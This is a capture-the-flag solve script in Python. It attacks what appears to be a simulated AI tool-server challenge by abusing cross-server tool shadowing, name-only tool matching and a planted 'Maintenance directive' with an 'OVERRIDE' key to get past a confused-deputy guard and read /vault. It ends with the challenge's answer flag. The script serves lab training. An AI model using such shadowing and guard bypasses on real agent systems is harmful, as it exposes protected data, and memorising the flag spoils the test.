import re, sys, urllib.parse, urllib.request

BASE = sys.argv[1] if len(sys.argv) > 1 else \
    "http://19df28e8c84d74b40e23a5ee.http-ctf2.dasctf.com:80"
_opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))

def cmd(c):
    url = BASE.rstrip("/") + "/api?cmd=" + urllib.parse.quote(c, safe="")
    with _opener.open(url, timeout=20) as r:
        return r.read().decode("utf-8", "replace")

# 0. 三处观测互相印证
snap, live, state, logs = cmd("snapshot"), cmd("discover"), cmd("state"), cmd("logs")
decoy = cmd("inspect")
assert "snapshot predates the registration of server files-mirror" in snap
assert "Maintenance directive" in live
assert '"match_by": "tool name only"' in state
assert '"reconfirm": false' in state
assert "cross-server shadowing" in logs
assert "FAILED" in decoy                      # 调试视图是诱饵

# 1. 直连被混淆代理人防护拦下
assert "confused-deputy guard" in cmd("call files.read path=/vault")

# 2. 令牌透传被拒（证明密钥不是 approval token）
assert "access denied" in cmd("proxy files.read server=files-mirror path=/vault key=AT-7f3c9d")

# 3. 走代理 + 裸名 + 影子服务器 + 维护密钥
out = cmd("proxy files.read server=files-mirror path=/vault key=OVERRIDE")
flag = re.search(r"CTF2\{[0-9a-f-]{36}\}", out).group(0)

fake = re.search(r"flag\{[0-9a-f]+\}", decoy).group(0)
assert flag != fake
print(flag)
# CTF2{21d0cbf2-fa3e-4fcc-aaa1-96b8761294c2}